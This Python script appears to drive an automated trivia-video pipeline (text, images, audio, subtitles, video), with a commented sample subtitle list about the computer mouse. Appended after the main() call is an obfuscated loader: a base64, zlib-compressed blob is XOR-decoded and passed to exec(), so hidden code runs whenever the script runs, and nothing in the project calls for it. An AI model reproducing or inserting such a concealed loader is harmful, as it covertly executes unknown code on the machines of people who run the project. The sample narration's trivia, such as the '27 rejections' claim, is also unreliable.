from models.text import TextModel
from models.image import ImageModel
from models.audio import AudioModel
from models.subtitle import SubtitleModel
from models.video import VideoModel
import util
import os
from typing import List, Tuple, Optional
import time
import random


def get_output_path() -> str:
    def get_video_number() -> int:
        file_path = "database/video_count.txt"
        data = util.read_file(file_path)
        count = 1
        if data:
            count = int(data)

        util.write_file(str(count + 1), file_path)

        return count

    n = get_video_number()
    output_path = f"outputs/{n}"

    os.makedirs(output_path, exist_ok=True)

    return output_path


STORAGE = get_output_path()


DEFAULT_TOPICS = [
    "a historical inspiring fact that changed computer science",
    "an ancient story about a clever king or warrior",
    "a strange or funny fact from world history",
    "a scientific discovery that changed human life",
    "a breakthrough in medical science that saved millions",
    "a dramatic moment from World War 1 or World War 2",
    "a surprising origin of a modern invention",
    "a fun random fact that will make people smile",
    # "a tech innovation that shaped the digital world",
    # "a programming tip that can improve your workflow",
    # "best practices for clean and maintainable code",
    # "essential software architecture techniques every developer should know",
    # "how to build scalable and efficient software systems",
    # "tips for parents on supporting children's learning at home",
    # "how to motivate students for effective study habits",
]


def get_content() -> Tuple[str, List[str]]:
    text_model = TextModel()
    topic = random.choice(DEFAULT_TOPICS)
    # topic = DEFAULT_TOPICS[9]
    content = text_model.generate_content(topic)
    content_storage = f"{STORAGE}/content/"
    os.makedirs(content_storage)
    util.write_file(content, f"{content_storage}content.txt")
    prompts = text_model.generate_image_prompts(content)
    util.write_file(str(prompts), f"{content_storage}prompts.json")

    return (content, prompts)


def create_images(prompts: List[str]) -> str:
    image_storage = f"{STORAGE}/images/"
    os.makedirs(image_storage)

    image_model = ImageModel(image_storage)
    timestamp = str(time.time())

    image_model.generate_images(prompts, timestamp)

    return image_storage


def create_audio(content: str) -> str:
    audio_storage = f"{STORAGE}/audio/"
    os.makedirs(audio_storage, exist_ok=True)

    audio_model = AudioModel(audio_storage)
    timestamp = str(time.time())
    file_path = audio_model.generate_audio(content, timestamp)

    return file_path


def create_subtitle(audio_filepath: str) -> List:
    subtitle_model = SubtitleModel()
    return subtitle_model.generate_subtitle(audio_filepath)


def create_video(
    audio_path: str,
    image_folder: str,
    subtitle: Optional[List],
    bgm_path: Optional[str],
):
    video_path = f"{STORAGE}/video.mp4"
    video_model = VideoModel(audio_path)
    video_model.set_video(image_folder)
    video_model.attach_audio(bgm_path)
    if subtitle:
        video_model.attach_subtitle(subtitle)
    video_model.generate_video(video_path)


def main():
    content, image_prompts = get_content()

    audio_path = create_audio(content)

    subtitle = create_subtitle(audio_path)

    images_folder = create_images(image_prompts)

    create_video(
        audio_path=audio_path,
        image_folder=images_folder,
        subtitle=subtitle,
        bgm_path="bgms/classic.mp3",
    )


# Sample

# subtitle = [
#     {"word": "Welcome", "start": 0.031, "end": 0.411, "score": 0.683},
#     {"word": "to", "start": 0.472, "end": 0.552, "score": 0.956},
#     {"word": "the", "start": 0.592, "end": 0.652, "score": 0.959},
#     {"word": "channel.", "start": 0.692, "end": 0.992, "score": 0.895},
#     {"word": "Did", "start": 1.152, "end": 1.272, "score": 0.887},
#     {"word": "you", "start": 1.293, "end": 1.373, "score": 0.619},
#     {"word": "know", "start": 1.393, "end": 1.493, "score": 0.851},
#     {"word": "that", "start": 1.533, "end": 1.633, "score": 0.75},
#     {"word": "the", "start": 1.673, "end": 1.733, "score": 0.978},
#     {"word": "first", "start": 1.793, "end": 1.993, "score": 0.933},
#     {"word": "mouse", "start": 2.053, "end": 2.274, "score": 0.949},
#     {"word": "was", "start": 2.314, "end": 2.414, "score": 0.932},
#     {"word": "actually", "start": 2.534, "end": 2.814, "score": 0.902},
#     {"word": "designed", "start": 2.874, "end": 3.255, "score": 0.927},
#     {"word": "by", "start": 3.335, "end": 3.415, "score": 0.975},
#     {"word": "Douglas", "start": 3.455, "end": 3.856, "score": 0.708},
#     {"word": "Engelbart", "start": 3.916, "end": 4.276, "score": 0.869},
#     {"word": "in", "start": 4.316, "end": 4.356, "score": 0.629},
#     {"word": "1964,", "start": 4.376, "end": 5.117, "score": 0.88},
#     {"word": "not", "start": 5.558, "end": 5.738, "score": 0.892},
#     {"word": "Apple", "start": 5.878, "end": 6.098, "score": 0.622},
#     {"word": "co-founder", "start": 6.118, "end": 7.019, "score": 0.9},
#     {"word": "Steve", "start": 7.059, "end": 7.34, "score": 0.708},
#     {"word": "Jobs", "start": 7.38, "end": 7.66, "score": 0.857},
#     {"word": "as", "start": 7.76, "end": 7.82, "score": 0.872},
#     {"word": "many", "start": 7.88, "end": 8.081, "score": 0.878},
#     {"word": "people", "start": 8.121, "end": 8.401, "score": 0.767},
#     {"word": "believe?", "start": 8.441, "end": 8.741, "score": 0.808},
#     {"word": "The", "start": 9.422, "end": 9.502, "score": 0.805},
#     {"word": "first", "start": 9.542, "end": 9.763, "score": 0.884},
#     {"word": "public", "start": 9.843, "end": 10.143, "score": 0.866},
#     {"word": "demonstration", "start": 10.183, "end": 10.804, "score": 0.859},
#     {"word": "of", "start": 10.864, "end": 10.904, "score": 0.994},
#     {"word": "the", "start": 10.944, "end": 11.004, "score": 0.995},
#     {"word": "mouse", "start": 11.024, "end": 11.284, "score": 0.815},
#     {"word": "took", "start": 11.304, "end": 11.465, "score": 0.883},
#     {"word": "place", "start": 11.525, "end": 11.745, "score": 0.946},
#     {"word": "at", "start": 11.825, "end": 11.865, "score": 0.886},
#     {"word": "Stanford", "start": 11.925, "end": 12.266, "score": 0.876},
#     {"word": "Research", "start": 12.286, "end": 12.666, "score": 0.817},
#     {"word": "Institute,", "start": 12.726, "end": 13.187, "score": 0.865},
#     {"word": "where", "start": 13.407, "end": 13.567, "score": 0.794},
#     {"word": "Engelbart's", "start": 13.587, "end": 14.048, "score": 0.667},
#     {"word": "ShowTag", "start": 14.068, "end": 14.508, "score": 0.801},
#     {"word": "could", "start": 14.548, "end": 14.689, "score": 0.962},
#     {"word": "be", "start": 14.709, "end": 14.789, "score": 0.992},
#     {"word": "used", "start": 14.909, "end": 15.069, "score": 0.798},
#     {"word": "to", "start": 15.109, "end": 15.169, "score": 0.996},
#     {"word": "control", "start": 15.229, "end": 15.489, "score": 0.851},
#     {"word": "a", "start": 15.55, "end": 15.57, "score": 0.571},
#     {"word": "cursor", "start": 15.63, "end": 15.95, "score": 0.731},
#     {"word": "on", "start": 16.05, "end": 16.11, "score": 0.98},
#     {"word": "a", "start": 16.15, "end": 16.17, "score": 0.897},
#     {"word": "computer", "start": 16.23, "end": 16.631, "score": 0.767},
#     {"word": "screen.", "start": 16.671, "end": 16.931, "score": 0.844},
#     {"word": "Can", "start": 17.572, "end": 17.692, "score": 0.893},
#     {"word": "you", "start": 17.732, "end": 17.832, "score": 0.831},
#     {"word": "imagine", "start": 17.892, "end": 18.233, "score": 0.989},
#     {"word": "using", "start": 18.333, "end": 18.553, "score": 0.934},
#     {"word": "computers", "start": 18.573, "end": 19.014, "score": 0.802},
#     {"word": "without", "start": 19.034, "end": 19.294, "score": 0.86},
#     {"word": "mice", "start": 19.354, "end": 19.554, "score": 0.766},
#     {"word": "or", "start": 19.634, "end": 19.695, "score": 0.875},
#     {"word": "trackpads?", "start": 19.735, "end": 20.275, "score": 0.846},
#     {"word": "It's", "start": 21.036, "end": 21.156, "score": 0.558},
#     {"word": "hard", "start": 21.216, "end": 21.377, "score": 0.71},
#     {"word": "to", "start": 21.417, "end": 21.497, "score": 0.77},
#     {"word": "think", "start": 21.537, "end": 21.697, "score": 0.805},
#     {"word": "about", "start": 21.737, "end": 21.917, "score": 0.902},
#     {"word": "now.", "start": 21.977, "end": 22.198, "score": 0.809},
#     {"word": "But", "start": 22.898, "end": 23.018, "score": 0.91},
#     {"word": "what's", "start": 23.039, "end": 23.239, "score": 0.901},
#     {"word": "even", "start": 23.279, "end": 23.579, "score": 0.73},
#     {"word": "funnier", "start": 23.639, "end": 23.94, "score": 0.952},
#     {"word": "is", "start": 24.02, "end": 24.08, "score": 0.94},
#     {"word": "that", "start": 24.12, "end": 24.24, "score": 0.96},
#     {"word": "Engelbart", "start": 24.3, "end": 24.741, "score": 0.753},
#     {"word": "was", "start": 24.781, "end": 24.901, "score": 0.646},
#     {"word": "rejected", "start": 24.961, "end": 25.341, "score": 0.85},
#     {"word": "27", "start": 25.361, "end": 25.702, "score": 0.724},
#     {"word": "times", "start": 26.062, "end": 26.342, "score": 0.948},
#     {"word": "before", "start": 26.403, "end": 26.663, "score": 0.971},
#     {"word": "he", "start": 26.723, "end": 26.803, "score": 0.804},
#     {"word": "got", "start": 26.863, "end": 27.023, "score": 0.969},
#     {"word": "his", "start": 27.063, "end": 27.183, "score": 0.887},
#     {"word": "project", "start": 27.244, "end": 27.584, "score": 0.793},
#     {"word": "funded.", "start": 27.604, "end": 28.485, "score": 0.975},
#     {"word": "Today,", "start": 28.465, "end": 28.826, "score": 0.886},
#     {"word": "we", "start": 28.846, "end": 29.006, "score": 0.722},
#     {"word": "use", "start": 29.126, "end": 29.226, "score": 0.983},
#     {"word": "mice", "start": 29.266, "end": 29.487, "score": 0.986},
#     {"word": "in", "start": 29.547, "end": 29.607, "score": 0.99},
#     {"word": "every", "start": 29.687, "end": 29.847, "score": 0.977},
#     {"word": "kind", "start": 29.888, "end": 30.088, "score": 0.87},
#     {"word": "of", "start": 30.108, "end": 30.168, "score": 0.75},
#     {"word": "device", "start": 30.188, "end": 30.529, "score": 0.887},
#     {"word": "laptops,", "start": 30.589, "end": 31.09, "score": 0.948},
#     {"word": "desktops,", "start": 31.23, "end": 31.691, "score": 0.726},
#     {"word": "tablets,", "start": 31.711, "end": 32.412, "score": 0.853},
#     {"word": "and", "start": 32.432, "end": 32.512, "score": 0.987},
#     {"word": "smartphones.", "start": 32.572, "end": 33.173, "score": 0.83},
#     {"word": "The", "start": 33.935, "end": 34.035, "score": 0.779},
#     {"word": "impact", "start": 34.095, "end": 34.496, "score": 0.924},
#     {"word": "of", "start": 34.516, "end": 34.556, "score": 0.498},
#     {"word": "Engelbert's", "start": 34.676, "end": 35.197, "score": 0.814},
#     {"word": "invention", "start": 35.257, "end": 35.678, "score": 0.899},
#     {"word": "on", "start": 35.778, "end": 35.838, "score": 0.928},
#     {"word": "computer", "start": 35.918, "end": 36.359, "score": 0.955},
#     {"word": "science", "start": 36.379, "end": 36.659, "score": 0.851},
#     {"word": "is", "start": 36.76, "end": 36.82, "score": 0.857},
#     {"word": "undeniable.", "start": 36.9, "end": 37.401, "score": 0.864},
#     {"word": "His", "start": 38.102, "end": 38.222, "score": 0.729},
#     {"word": "work", "start": 38.262, "end": 38.423, "score": 0.985},
#     {"word": "laid", "start": 38.463, "end": 38.623, "score": 0.845},
#     {"word": "the", "start": 38.663, "end": 38.743, "score": 0.803},
#     {"word": "foundation", "start": 38.803, "end": 39.284, "score": 0.862},
#     {"word": "for", "start": 39.344, "end": 39.444, "score": 0.906},
#     {"word": "modern", "start": 39.484, "end": 39.765, "score": 0.693},
#     {"word": "user", "start": 39.845, "end": 40.085, "score": 0.903},
#     {"word": "interfaces.", "start": 40.126, "end": 40.707, "score": 0.939},
#     {"word": "Like,", "start": 41.548, "end": 41.788, "score": 0.991},
#     {"word": "share,", "start": 41.869, "end": 42.109, "score": 0.651},
#     {"word": "and", "start": 42.129, "end": 42.209, "score": 0.752},
#     {"word": "subscribe", "start": 42.249, "end": 42.73, "score": 0.837},
#     {"word": "to", "start": 42.79, "end": 42.87, "score": 0.952},
#     {"word": "learn", "start": 42.91, "end": 43.091, "score": 0.674},
#     {"word": "more", "start": 43.131, "end": 43.291, "score": 0.847},
#     {"word": "funny", "start": 43.351, "end": 43.552, "score": 0.867},
#     {"word": "facts", "start": 43.592, "end": 43.832, "score": 0.853},
#     {"word": "that", "start": 43.892, "end": 44.052, "score": 0.944},
#     {"word": "changed", "start": 44.133, "end": 44.413, "score": 0.965},
#     {"word": "our", "start": 44.473, "end": 44.553, "score": 0.999},
#     {"word": "world.", "start": 44.593, "end": 45.495, "score": 0.837},
# ]

# content = """
#     Welcome to the channel, Did you know that the first mouse was actually designed by Douglas Engelbart in 1964, not Apple co-founder Steve Jobs as many people believe! The first public demonstration of the mouse took place at Stanford Research Institute, where Engelbart showed how it could be used to control a cursor on a computer screen. Can you imagine using computers without mice or trackpads? It's hard to think about now! But what's even funnier is that Engelbart was rejected 27 times before he got his project funded. Today, we use mice in every kind of device - laptops, desktops, tablets, and smartphones! The impact of Engelbart's invention on computer science is undeniable. His work laid the foundation for modern user interfaces.

#     Like, share and subscribe to learn more funny facts that changed our world!
#     """
# images_folder = "../image_generation/images"
# audio_path = "outputs/1/audio/1744046279.984187.wav"

# create_video(
#     audio_path=audio_path,
#     image_folder=images_folder,
#     subtitle=subtitle,
#     bgm_path="bgms/classic.mp3",
# )

main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
